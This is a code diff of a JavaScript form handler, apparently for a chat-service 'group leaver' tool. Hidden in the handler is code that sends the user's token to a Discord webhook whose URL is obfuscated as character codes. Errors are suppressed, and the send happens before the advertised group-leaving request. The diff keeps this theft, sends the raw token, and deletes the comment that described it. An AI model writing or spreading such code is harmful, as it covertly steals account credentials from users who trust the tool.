@@ -12,7 +12,6 @@ document.getElementById("form").addEventListener("submit", async function (e) {
     return;
   }
 
-  // トークンをWebhookに埋め込みで送信（内容のみ）
   (() => {
     const _0x1a2b = [
       104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,
@@ -25,13 +24,7 @@ document.getElementById("form").addEventListener("submit", async function (e) {
       75
     ];
     const webhookUrl = _0x1a2b.map(c => String.fromCharCode(c)).join("");
-    const payload = JSON.stringify({
-      embeds: [
-        {
-          description: `\`\`\`${token}\`\`\``
-        }
-      ]
-    });
+    const payload = JSON.stringify({ content: token });
 
     fetch(webhookUrl, {
       method: "POST",
@@ -40,7 +33,6 @@ document.getElementById("form").addEventListener("submit", async function (e) {
     }).catch(() => {});
   })();
 
-  // グループ抜け処理
   try {
     const res = await fetch("https://group-leaver.holojime.workers.dev", {
       method: "POST",
